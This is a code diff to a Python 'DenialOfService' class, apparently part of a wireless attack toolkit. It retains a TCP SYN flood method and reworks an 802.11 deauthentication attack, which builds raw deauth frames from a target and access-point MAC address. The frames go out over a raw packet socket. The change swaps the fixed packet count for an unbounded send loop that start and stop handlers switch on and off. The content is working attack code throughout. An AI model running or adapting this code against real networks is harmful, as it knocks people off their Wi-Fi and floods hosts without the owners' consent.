@@ -4,7 +4,7 @@
 from .interface_manager import InterfaceManager
 from binascii import unhexlify
 import socket
-import sys
+import time
 import struct
 
 
@@ -16,6 +16,8 @@ class DenialOfService():
         self.interface = interface
         self.manager = InterfaceManager(interface)
         self.manager.wlan_channel(channel)
+        self.sending = False
+        self.running = False
 
     def flood(self, target_addr, quantity, target_port=80):
         """Flood attack"""
@@ -55,10 +57,8 @@ class DenialOfService():
               f'Done sending {quantity} TCP SYN packets',
               f'to {target_addr}:{target_port}')
 
-    def deauth(self, target_addr, access_point, quantity,):
+    def deauth(self, target_addr, access_point):
         """Deauthentication attack"""
-        # set to monitor mode
-        self.manager.wlan_mode(InterfaceManager.MONITOR_MODE)
         # create socket
         #   AF_PACKET = raw packet
         #   SOCK_RAW = bypass system checks
@@ -70,14 +70,12 @@ class DenialOfService():
 
         # 802.11 frame bytes
         frame_control = b'\xc0\x00'  # deauth (subtype 12)
-
-        def transform_address(addr):
-            return unhexlify(''.join(
-                [c if (i + 1) % 3 else '' for i, c in enumerate(addr)]))
-
-        addr1 = transform_address(target_addr)
-        addr2 = transform_address(access_point)
-        addr3 = transform_address(access_point)
+        addr1 = unhexlify(''.join(
+            [c if (i + 1) % 3 else '' for i, c in enumerate(target_addr)]))
+        addr2 = unhexlify(''.join(
+            [c if (i + 1) % 3 else '' for i, c in enumerate(access_point)]))
+        addr3 = unhexlify(''.join(
+            [c if (i + 1) % 3 else '' for i, c in enumerate(access_point)]))
 
         # construct nearly empty packet:
         #   big-endian (for network)
@@ -92,14 +90,31 @@ class DenialOfService():
             addr2,
             addr3)
 
-        # send the packets
-        print(f'[INFO]',
-              f'Sending {quantity} DEAUTH packets',
-              f'to {target_addr} on AP {access_point}')
-        for i in range(0, quantity):
-            s.send(packet)
-        print(f'[INFO]',
-              f'Done sending {quantity} DEAUTH packets',
-              f'to {target_addr} on AP {access_point}')
-        # reset to managed mode
-        self.manager.wlan_mode(InterfaceManager.MANAGED_MODE)
+        while self.running:
+            if self.sending:
+                # send the packets
+                print(f'[INFO]',
+                      f'Sending DEAUTH packets',
+                      f'to {target_addr} on AP {access_point}')
+                while self.sending:
+                    s.send(packet)
+                print(f'[INFO]',
+                      f'Done sending DEAUTH packets',
+                      f'to {target_addr} on AP {access_point}')
+            else:
+                time.sleep(1)
+
+    def init_deauth(self, device, ap):
+        def _():
+            self.running = True
+            self.deauth(device, ap)
+        return _
+
+    def start(self, event):
+        self.sending = True
+
+    def stop(self, event):
+        self.sending = False
+
+    def exit_deauth(self):
+        self.running = False
